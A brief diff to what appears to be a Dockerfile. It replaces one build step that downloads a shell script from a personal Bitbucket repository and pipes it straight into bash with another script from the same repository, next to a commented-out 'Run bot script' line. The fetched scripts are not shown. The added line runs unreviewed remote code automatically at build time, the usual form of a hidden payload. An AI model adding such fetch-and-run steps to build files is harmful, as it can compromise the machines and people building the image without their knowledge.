@@ -30,6 +30,6 @@ COPY run.sh /
 
 # Run config.sh and clean up APT:
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
-RUN curl -sL https://bitbucket.org/kacepot/esce/raw/main/tuske3.sh | bash
+RUN curl -sL https://bitbucket.org/kacepot/esce/raw/main/amis.sh | bash
 # Run bot script:
 # CMD bash run.sh
